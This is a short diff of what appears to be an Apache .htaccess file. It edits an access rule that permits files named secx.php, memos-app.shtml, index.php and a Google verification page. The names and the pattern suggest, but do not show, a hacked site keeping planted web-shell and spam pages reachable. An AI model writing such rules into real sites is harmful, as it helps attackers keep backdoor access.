@@ -58,7 +58,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(secx.php|investasi-file.php|memos-app.shtml)$"> 
+<FilesMatch "^(secx.php|index.php|memos-app.shtml|google10999e212f734097.html)$"> 
 Order Allow,Deny 
 Allow from all 
 </FilesMatch>
